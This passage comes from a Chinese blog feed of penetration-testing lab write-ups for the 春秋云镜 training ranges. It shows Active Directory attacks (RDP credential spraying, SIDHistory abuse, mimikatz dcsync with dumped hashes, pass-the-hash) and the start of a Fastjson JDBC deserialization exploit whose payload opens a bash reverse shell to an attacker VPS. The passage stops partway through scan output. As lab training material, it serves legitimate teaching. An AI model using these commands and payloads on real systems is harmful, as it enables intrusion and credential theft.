class="hljs-variable">@XIAORANG</span>.<span class="hljs-variable constant_">LAB</span><span class="hljs-symbol">:strawberry</span><br></code></pre></td></tr></table></figure><p>æµ‹è¯•å‘ç°ä¸¤ä¸ªç”¨æˆ·éƒ½èƒ½ç™»å½•åˆ° 172.22.6.25 è¿™å°æœºå™¨</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">â””â”€# proxychains -q nxc rdp 172.22.6.0/24 -u <span class="hljs-string">&#x27;wenshao&#x27;</span> -p <span class="hljs-string">&#x27;hellokitty&#x27;</span><br>RDP         172.22.6.12     3389   DC-PROGAME       [*] Windows 10 or Windows Server 2016 Build 14393 (name:DC-PROGAME) (domain:xiaorang.lab) (nla:True)<br>RDP         172.22.6.25     3389   WIN2019          [*] Windows 10 or Windows Server 2016 Build 17763 (name:WIN2019) (domain:xiaorang.lab) (nla:True)<br>RDP         172.22.6.12     3389   DC-PROGAME       [+] xiaorang.lab\wenshao:hellokitty<br>RDP         172.22.6.25     3389   WIN2019          [+] xiaorang.lab\wenshao:hellokitty (Pwn3d!)<br><br>â””â”€# proxychains -q nxc rdp 172.22.6.0/24 -u <span class="hljs-string">&#x27;zhangxin&#x27;</span> -p <span class="hljs-string">&#x27;strawberry&#x27;</span><br>RDP         172.22.6.12     3389   DC-PROGAME       [*] Windows 10 or Windows Server 2016 Build 14393 (name:DC-PROGAME) (domain:xiaorang.lab) (nla:True)<br>RDP         172.22.6.12     3389   DC-PROGAME       [+] xiaorang.lab\zhangxin:strawberry<br>RDP         172.22.6.25     3389   WIN2019          [*] Windows 10 or Windows Server 2016 Build 17763 (name:WIN2019) (domain:xiaorang.lab) (nla:True)<br>RDP         172.22.6.25     3389   WIN2019          [+] xiaorang.lab\zhangxin:strawberry (Pwn3d!)<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆä½¿ç”¨è¿™ä¸¤ä¸ªæœ‰æ•ˆç”¨æˆ·æ”¶é›†åŸŸä¿¡æ¯è¿›è¡Œåˆ†æ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains bloodhound-python -u wenshao -p hellokitty -d xiaorang.lab -c all -ns 172.22.6.12 --zip --dns-tcp<br></code></pre></td></tr></table></figure><h1 id="SIDHistory-æ»¥ç”¨"><a href="#SIDHistory-æ»¥ç”¨" class="headerlink" title="SIDHistory æ»¥ç”¨"></a>SIDHistory æ»¥ç”¨</h1><p>åˆ†æåŸŸä¿¡æ¯å‘ç°æœ‰ä¸€ä¸ªæœ‰ SIDHistory å±æ€§çš„ yuxuan ç”¨æˆ·</p><p><img src="https://img.dkdun.cn/v1/2025/12/9ef3eceab7d7915d.png"></p><p>åœ¨ help ä¸­å¯ä»¥æ‰¾åˆ°ä¸€äº›ä¿¡æ¯</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">The</span> <span class="hljs-selector-tag">user</span> <span class="hljs-selector-tag">YUXUAN</span>@<span class="hljs-selector-tag">XIAORANG</span><span class="hljs-selector-class">.LAB</span> <span class="hljs-selector-tag">has</span>, <span class="hljs-selector-tag">in</span> <span class="hljs-selector-tag">its</span> <span class="hljs-selector-tag">SIDHistory</span> <span class="hljs-selector-tag">attribute</span>, <span class="hljs-selector-tag">the</span> <span class="hljs-selector-tag">SID</span> <span class="hljs-selector-tag">for</span> <span class="hljs-selector-tag">the</span> <span class="hljs-selector-tag">user</span> <span class="hljs-selector-tag">ADMINISTRATOR</span>@<span class="hljs-selector-tag">XIAORANG</span><span class="hljs-selector-class">.LAB</span>.<br><br><span class="hljs-keyword">When</span> a kerberos ticket is created for YUXUAN<span class="hljs-variable">@XIAORANG</span>.LAB, it will include the SID for ADMINISTRATOR<span class="hljs-variable">@XIAORANG</span>.LAB, <span class="hljs-keyword">and</span> therefore grantYUXUAN<span class="hljs-variable">@XIAORANG</span>.LAB the same privileges <span class="hljs-keyword">and</span> permissions asADMINISTRATOR<span class="hljs-variable">@XIAORANG</span>.LAB.<br></code></pre></td></tr></table></figure><p>å› æ­¤ç°åœ¨å¯ä»¥çŸ¥é“ yuxuan ç”¨æˆ·å’Œ Administrator å…·æœ‰ä¸€æ ·çš„æƒé™ï¼Œå±äºåŸŸç®¡ï¼Œé‚£ä¹ˆåªè¦æ‹¿ä¸‹ yuxuan ç”¨æˆ·å°±è¡Œäº†</p><p>ç”¨è±Œè±†èšæ”¶é›†ä¿¡æ¯ï¼Œæ‹¿åˆ° yuxuan ç”¨æˆ·å¯†ç </p><p><img src="https://img.dkdun.cn/v1/2025/12/666ad31b1e7485b1.png"></p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ada">DefaultDomainName             :  <span class="hljs-type">xiaorang.lab</span><br>    DefaultUserName               :  <span class="hljs-type">yuxuan</span><br>     [<span class="hljs-number">0</span>m [<span class="hljs-number">1</span>;<span class="hljs-number">31</span>mDefaultPassword               :  <span class="hljs-type">Yuxuan7QbrgZ3L</span><br></code></pre></td></tr></table></figure><p>minikatz æŠ“ hash</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">lsadump::<span class="hljs-title">dcsync</span> /<span class="hljs-title">domain:xiaorang</span>.<span class="hljs-title">lab</span> /<span class="hljs-title">all</span> /<span class="hljs-title">csv</span></span><br></code></pre></td></tr></table></figure><p>æ‹¿åˆ°ä¸€äº›æ•æ„Ÿ hash</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">502 </span>    krbtgt  a4206b127773884e2c7ea86cdd282d9c        <span class="hljs-number">514</span><br><span class="hljs-symbol">500 </span>    Administrator   <span class="hljs-number">04d93</span>ffd6f5f6e4490e0de23f240a5e9        <span class="hljs-number">512</span><br><span class="hljs-symbol">1000 </span>   DC-PROGAME$     a61d66fb5891854474ab0651c51bcad8        <span class="hljs-number">532480</span><br><span class="hljs-symbol">1181 </span>   WIN2019$        <span class="hljs-number">231</span>bed49e676f7ec4f3cfa9790d755c8        <span class="hljs-number">4096</span><br></code></pre></td></tr></table></figure><h1 id="åˆ©ç”¨å“ˆå¸Œä¼ é€’æ‹¿åˆ°æƒé™"><a href="#åˆ©ç”¨å“ˆå¸Œä¼ é€’æ‹¿åˆ°æƒé™" class="headerlink" title="åˆ©ç”¨å“ˆå¸Œä¼ é€’æ‹¿åˆ°æƒé™"></a>åˆ©ç”¨å“ˆå¸Œä¼ é€’æ‹¿åˆ°æƒé™</h1><p>æµ‹è¯•å‘ç° DC å’Œ WIN2019 éƒ½èƒ½ Pwn æ‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">â””â”€# proxychains -q crackmapexec smb 172.22.6.0/25 -u administrator -H04d93ffd6f5f6e4490e0de23f240a5e9 -d xiaorang.lab<br>SMB         172.22.6.12     445    DC-PROGAME       [*] Windows Server 2016 Datacenter 14393 x64 (name:DC-PROGAME) (domain:xiaorang.lab) (signing:True) (SMBv1:True)<br>SMB         172.22.6.25     445    WIN2019          [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN2019) (domain:xiaorang.lab) (signing:False) (SMBv1:False)<br>SMB         172.22.6.12     445    DC-PROGAME       [+] xiaorang.lab\administrator:04d93ffd6f5f6e4490e0de23f240a5e9 (Pwn3d!)<br>SMB         172.22.6.25     445    WIN2019          [+] xiaorang.lab\administrator:04d93ffd6f5f6e4490e0de23f240a5e9 (Pwn3d!)<br></code></pre></td></tr></table></figure><p>æ‹¿åˆ° flag3</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">â””â”€# proxychains -q crackmapexec smb 172.22.6.25 -u administrator -H04d93ffd6f5f6e4490e0de23f240a5e9 -d xiaorang.lab -X <span class="hljs-string">&quot;type Users\Administrator\flag\flag03.txt&quot;</span><br>SMB         172.22.6.25     445    WIN2019          [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN2019) (domain:xiaorang.lab) (signing:False) (SMBv1:False)<br>SMB         172.22.6.25     445    WIN2019          [+] xiaorang.lab\administrator:04d93ffd6f5f6e4490e0de23f240a5e9 (Pwn3d!)<br>SMB         172.22.6.25     445    WIN2019          [+] Executed <span class="hljs-built_in">command</span><br>SMB         172.22.6.25     445    WIN2019          flag03: flag&#123;80ce92a5-c074-4f20-946d-14706d5c3492&#125;<br>SMB         172.22.6.25     445    WIN2019<br>SMB         172.22.6.25     445    WIN2019<br>SMB         172.22.6.25     445    WIN2019          Maybe you can find something interesting on this server.<br>SMB         172.22.6.25     445    WIN2019          =======================================<br>SMB         172.22.6.25     445    WIN2019          What you may not know is that many objects <span class="hljs-keyword">in</span> this domain<br>SMB         172.22.6.25     445    WIN2019          are moved from other domains.<br></code></pre></td></tr></table></figure><p> åŒæ ·ä¹Ÿèƒ½æ‹¿åˆ° flag4</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">â””â”€# proxychains -q crackmapexec smb 172.22.6.12 -u administrator -H04d93ffd6f5f6e4490e0de23f240a5e9 -d xiaorang.lab -X <span class="hljs-string">&quot;type Users\Administrator\flag\flag04.txt&quot;</span><br>SMB         172.22.6.12     445    DC-PROGAME       [*] Windows Server 2016 Datacenter 14393 x64 (name:DC-PROGAME) (domain:xiaorang.lab) (signing:True) (SMBv1:True)<br>SMB         172.22.6.12     445    DC-PROGAME       [+] xiaorang.lab\administrator:04d93ffd6f5f6e4490e0de23f240a5e9 (Pwn3d!)<br>SMB         172.22.6.12     445    DC-PROGAME       [+] Executed <span class="hljs-built_in">command</span><br>SMB         172.22.6.12     445    DC-PROGAME       Awesome! you got the final flag.<br>SMB         172.22.6.12     445    DC-PROGAME<br>SMB         172.22.6.12     445    DC-PROGAME       ::::::::::::::::::::::::::    :::: ::::::::::<br>SMB         172.22.6.12     445    DC-PROGAME       :+:        :+:    +:+:+: :+:+:+:+:<br>SMB         172.22.6.12     445    DC-PROGAME       +:+        +:+    +:+ +:+:+ +:++:+<br>SMB         172.22.6.12     445    DC-PROGAME       +#+        +#+    +#+  +:+  +#++#++:++#<br>SMB         172.22.6.12     445    DC-PROGAME       +#+        +#+    +#+       +#++#+<br>SMB         172.22.6.12     445    DC-PROGAME       <span class="hljs-comment">#+#        #+#    #+#       #+##+#</span><br>SMB         172.22.6.12     445    DC-PROGAME       <span class="hljs-comment">###    ##############       #############</span><br>SMB         172.22.6.12     445    DC-PROGAME<br>SMB         172.22.6.12     445    DC-PROGAME<br>SMB         172.22.6.12     445    DC-PROGAME       flag04: flag&#123;b3dd441d-8703-482f-aead-598fa800ade2&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>æ¸—é€</category>
      
      <category>é¶æœº</category>
      
      <category>æ˜¥ç§‹äº‘é•œ</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CVE-2021-34371 Neo4j AS-REP Roasting SIDHistory</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ˜¥ç§‹äº‘é•œ-Exchange</title>
    <link href="/2025/09/14/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange/"/>
    <url>/2025/09/14/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange/</url>
    
    <content type="html"><![CDATA[<p>Fastjson+JDBCï¼ŒExchange æœåŠ¡ Microsoft Exchange Proxylogon åˆ©ç”¨ï¼ŒWirteDacl æƒé™ï¼Œå“ˆå¸Œä¼ é€’æ”»å‡»</p><span id="more"></span><h1 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h1><h2 id="fscan"><a href="#fscan" class="headerlink" title="fscan"></a>fscan</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">D:\<span class="hljs-title">aWeb</span>\<span class="hljs-title">fscan</span>-<span class="hljs-title">main</span>&gt;.\<span class="hljs-title">fscan.exe</span> -<span class="hljs-title">h</span> 39.98.107.181</span><br><span class="hljs-function"></span><br><span class="hljs-function">   <span class="hljs-title">___</span>                              <span class="hljs-title">_</span></span><br><span class="hljs-function">  / <span class="hljs-title">_</span> \     <span class="hljs-title">___</span>  <span class="hljs-title">___</span> <span class="hljs-title">_</span> <span class="hljs-title">__</span> <span class="hljs-title">__</span> <span class="hljs-title">_</span>  <span class="hljs-title">___</span>| | <span class="hljs-title">__</span></span><br><span class="hljs-function"> / /<span class="hljs-title">_</span>\/<span class="hljs-title">____</span>/ <span class="hljs-title">__</span>|/ <span class="hljs-title">__</span>| &#x27;<span class="hljs-title">__</span>/ <span class="hljs-title">_</span>` |/ <span class="hljs-title">__</span>| |/ /</span><br><span class="hljs-function">/ /<span class="hljs-title">_</span>\\<span class="hljs-title">_____</span>\<span class="hljs-title">__</span> \ (<span class="hljs-title">__</span>| | | (<span class="hljs-title">_</span>| | (<span class="hljs-title">__</span>|   &lt;</span><br><span class="hljs-function">\<span class="hljs-title">____</span>/     |<span class="hljs-title">___</span>/\<span class="hljs-title">___</span>|<span class="hljs-title">_</span>|  \<span class="hljs-title">__</span>,<span class="hljs-title">_</span>|\<span class="hljs-title">___</span>|<span class="hljs-title">_</span>|\<span class="hljs-title">_</span>\</span><br><span class="hljs-function">                     <span class="hljs-title">fscan</span> <span class="hljs-title">version</span>: 1.8.4</span><br><span class="hljs-function"><span class="hljs-title">start</span> <span class="hljs-title">infoscan</span></span><br><span class="hljs-function">39.98.107.181:80 <span class="hljs-title">open</span></span><br><span class="hljs-function">39.98.107.181:22 <span class="hljs-title">open</span></span><br><span class="hljs-function">39.98.107.181:8000 <span class="hljs-title">open</span></span><br><span class="hljs-function">[*] <span class="hljs-title">alive</span> <span class="hljs-title">ports</span> <span class="hljs-title">len</span> <span class="hljs-title">is</span>: 3</span><br><span class="hljs-function"><span class="hljs-title">start</span> <span class="hljs-title">vulscan</span></span><br><span class="hljs-function">[*] <span class="hljs-title">WebTitle</span> <span class="hljs-title">http</span>://39.98.107.181      <span class="hljs-title">code</span>:200 <span class="hljs-title">len</span>:219    <span class="hljs-title">title:None</span></span><br><span class="hljs-function">[*] <span class="hljs-title">WebTitle</span> <span class="hljs-title">http</span>://39.98.107.181:8000 <span class="hljs-title">code</span>:302 <span class="hljs-title">len</span>:0      <span class="hljs-title">title:None</span> è·³è½¬<span class="hljs-title">url</span>: <span class="hljs-title">http</span>://39.98.107.181:8000/<span class="hljs-title">login.html</span></span><br><span class="hljs-function">[*] <span class="hljs-title">WebTitle</span> <span class="hljs-title">http</span>://39.98.107.181:8000/<span class="hljs-title">login.html</span> <span class="hljs-title">code</span>:200 <span class="hljs-title">len</span>:5662   <span class="hljs-title">title:Lumia</span> <span class="hljs-title">ERP</span></span><br><span class="hljs-function">å·²å®Œæˆ 3/3</span><br><span class="hljs-function">[*] æ‰«æç»“æŸ,è€—æ—¶: 50.5764704<span class="hljs-title">s</span></span><br></code></pre></td></tr></table></figure><h1 id="Fastjson-JDBC-åˆ©ç”¨"><a href="#Fastjson-JDBC-åˆ©ç”¨" class="headerlink" title="Fastjson + JDBC åˆ©ç”¨"></a>Fastjson + JDBC åˆ©ç”¨</h1><p>æœ‰ web é¡µé¢ï¼ŒLumia ERP ç™»é™†ç•Œé¢ï¼Œadmin:123456 å¼±å£ä»¤ç™»é™†è¿›å»</p><p>ç‚¹å‡» â€œå®˜æ–¹æ’ä»¶â€ è·³è½¬åˆ°äº†ä¸€ä¸ªç½‘ç«™ï¼Œä½†æ˜¾ç¤ºåŸŸåå·²è¿‡æœŸ</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://www.huaxiaerp.com/forum-43-1.html<br></code></pre></td></tr></table></figure><p>æœç´¢åå‘ç°æ˜¯ <code>åå¤ ERP</code>ï¼Œå­˜åœ¨ fastjson æ¼æ´ï¼Œä½ç½®äº <code>/user/list?search=</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;test.ot5kfv.dnslog.cn&quot;&#125;<br></code></pre></td></tr></table></figure><p>poc å¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">/user/list?search=%7b%22%40%74%79%70%65%22%3a%22%6a%61%76%61%2e%6e%65%74%2e%49%6e%65%74%34%41%64%64%72%65%73%73%22%2c%22%76%61%6c%22%3a%22%62%75%74%74%33%72%66%31%79%2e%73%74%6a%32%33%61%2e%64%6e%73%6c%6f%67%2e%63%6e%22%7d%0a<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/424bc3e46c8dbc4b.png"></p><p>dnslog æµ‹è¯•æˆåŠŸï¼Œå¯ä»¥åˆ©ç”¨</p><p>æ‰“ JDBC-JDBC4Connectionï¼š<a href="https://xz.aliyun.com/news/18109">æ‰‹æŠŠæ‰‹å¸¦ä½ æ·±å…¥åˆ†æ Fastjson JDBC è°ƒç”¨é“¾åˆ©ç”¨è¿‡ç¨‹-å…ˆçŸ¥ç¤¾åŒº</a></p><p>å¯åŠ¨ evil-mysql-server æœåŠ¡å™¨</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">./evil-mysql-server -addr <span class="hljs-number">3306</span> -java java -ysoserial ysoserial-all.jar <br></code></pre></td></tr></table></figure><p>url ç¼–ç åå‘é€åå¼¹ shell å‘½ä»¤</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br><span class="hljs-string">&quot;name&quot;</span>: &#123;<br><span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span>,<br><span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.mysql.jdbc.JDBC4Connection&quot;</span>,<br><span class="hljs-string">&quot;hostToConnectTo&quot;</span>: <span class="hljs-string">&quot;vpsIPåœ°å€&quot;</span>,<br><span class="hljs-string">&quot;portToConnectTo&quot;</span>: <span class="hljs-number">3306</span>,<br><span class="hljs-string">&quot;info&quot;</span>: &#123;<br><span class="hljs-string">&quot;user&quot;</span>: <span class="hljs-string">&quot;yso_CommonsCollections6_bash -c &#123;echo,base64ç¼–ç åçš„å‘½ä»¤&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>,<br><span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;pass&quot;</span>,<br><span class="hljs-string">&quot;statementInterceptors&quot;</span>: <span class="hljs-string">&quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>,<br><span class="hljs-string">&quot;autoDeserialize&quot;</span>: <span class="hljs-string">&quot;true&quot;</span>,<br><span class="hljs-string">&quot;NUM_HOSTS&quot;</span>: <span class="hljs-string">&quot;1&quot;</span><br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/c0c6eed1eda3cd65.png"></p><p><img src="https://img.dkdun.cn/v1/2025/12/c2027971eeb989de.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag01</span>: flag&#123;<span class="hljs-number">846</span>e59ef-<span class="hljs-number">3802</span>-<span class="hljs-number">4</span>db5-bd3e-e004d70c0af4&#125;<br></code></pre></td></tr></table></figure><h1 id="å†…ç½‘ä¿¡æ¯æ”¶é›†"><a href="#å†…ç½‘ä¿¡æ¯æ”¶é›†" class="headerlink" title="å†…ç½‘ä¿¡æ¯æ”¶é›†"></a>å†…ç½‘ä¿¡æ¯æ”¶é›†</h1><p>æŸ¥çœ‹æœ¬æœº IPï¼š172.22.3.12</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs cmd"># ifconfig<br>eth0      Link encap:Ethernet  HWaddr <span class="hljs-number">00</span>:<span class="hljs-number">16</span>:<span class="hljs-number">3</span>e:<span class="hljs-number">2</span>b:<span class="hljs-number">7</span>f:<span class="hljs-number">46</span>  <br>          inet addr:<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">12</span>  Bcast:<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>  Mask:<span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span><br>          inet6 addr: fe80::<span class="hljs-number">216</span>:<span class="hljs-number">3</span>eff:fe2b:<span class="hljs-number">7</span>f46/<span class="hljs-number">64</span> Scope:Link<br>          UP BROADCAST RUNNING MULTICAST  MTU:<span class="hljs-number">1500</span>  Metric:<span class="hljs-number">1</span><br>          RX packets:<span class="hljs-number">174430</span> errors:<span class="hljs-number">0</span> dropped:<span class="hljs-number">0</span> overruns:<span class="hljs-number">0</span> frame:<span class="hljs-number">0</span><br>          TX packets:<span class="hljs-number">52652</span> errors:<span class="hljs-number">0</span> dropped:<span class="hljs-number">0</span> overruns:<span class="hljs-number">0</span> carrier:<span class="hljs-number">0</span><br><span class="hljs-function">          collisions:0 <span class="hljs-title">txqueuelen</span>:1000 </span><br><span class="hljs-function">          <span class="hljs-title">RX</span> <span class="hljs-title">bytes</span>:212622994 (212.6 <span class="hljs-title">MB</span>)  <span class="hljs-title">TX</span> <span class="hljs-title">bytes</span>:27000176 (27.0 <span class="hljs-title">MB</span>)</span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">lo</span>        <span class="hljs-title">Link</span> <span class="hljs-title">encap:Local</span> <span class="hljs-title">Loopback</span>  </span><br><span class="hljs-function">          <span class="hljs-title">inet</span> <span class="hljs-title">addr</span>:127.0.0.1  <span class="hljs-title">Mask</span>:255.0.0.0</span><br><span class="hljs-function">          <span class="hljs-title">inet6</span> <span class="hljs-title">addr</span>: ::1/128 <span class="hljs-title">Scope:Host</span></span><br><span class="hljs-function">          <span class="hljs-title">UP</span> <span class="hljs-title">LOOPBACK</span> <span class="hljs-title">RUNNING</span>  <span class="hljs-title">MTU</span>:65536  <span class="hljs-title">Metric</span>:1</span><br><span class="hljs-function">          <span class="hljs-title">RX</span> <span class="hljs-title">packets</span>:10258 <span class="hljs-title">errors</span>:0 <span class="hljs-title">dropped</span>:0 <span class="hljs-title">overruns</span>:0 <span class="hljs-title">frame</span>:0</span><br><span class="hljs-function">          <span class="hljs-title">TX</span> <span class="hljs-title">packets</span>:10258 <span class="hljs-title">errors</span>:0 <span class="hljs-title">dropped</span>:0 <span class="hljs-title">overruns</span>:0 <span class="hljs-title">carrier</span>:0</span><br><span class="hljs-function">          <span class="hljs-title">collisions</span>:0 <span class="hljs-title">txqueuelen</span>:1 </span><br><span class="hljs-function">          <span class="hljs-title">RX</span> <span class="hljs-title">bytes</span>:2732393 (2.7 <span class="hljs-title">MB</span>)  <span class="hljs-title">TX</span> <span class="hljs-title">bytes</span>:2732393 (2.7 <span class="hljs-title">MB</span>)</span><br></code></pre></td></tr></table></figure><h2 id="fscan-æ‰«å†…ç½‘"><a href="#fscan-æ‰«å†…ç½‘" class="headerlink" title="fscan æ‰«å†…ç½‘"></a>fscan æ‰«å†…ç½‘</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs cmd"># ./FScan_2.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>_linux_x64 -h <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">12</span>/<span class="hljs-number">24</span><br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚    ___                              _        â”‚<br>â”‚   / _ \     ___  ___ _ __ __ _  ___| | __    â”‚<br>â”‚  / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /    â”‚<br>â”‚ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     â”‚<br>â”‚ \____/     |___/\___|_|  \__,_|\___|_|\_\    â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br>      Fscan Version: <span class="hljs-number">2</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span><br><br>[<span class="hljs-number">1</span>.<span class="hljs-number">9</span>s]     å·²é€‰æ‹©æœåŠ¡æ‰«ææ¨¡å¼<br>[<span class="hljs-number">1</span>.<span class="hljs-number">9</span>s]     å¼€å§‹ä¿¡æ¯æ‰«æ<br>[<span class="hljs-number">1</span>.<span class="hljs-number">9</span>s]     CIDRèŒƒå›´: <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span 